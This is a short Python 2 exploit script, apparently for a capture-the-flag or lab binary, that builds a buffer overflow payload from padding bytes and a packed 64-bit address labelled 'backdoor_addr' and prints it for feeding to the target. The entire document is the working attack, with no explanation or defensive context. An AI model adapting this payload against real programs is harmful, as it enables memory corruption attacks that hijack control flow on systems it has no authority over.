import struct

backdoor_addr = 0x55555555488c

exploit = ""

exploit += "A"*40 + '\xff'

exploit += "A"*286

exploit += struct.pack("Q", backdoor_addr)

print exploit
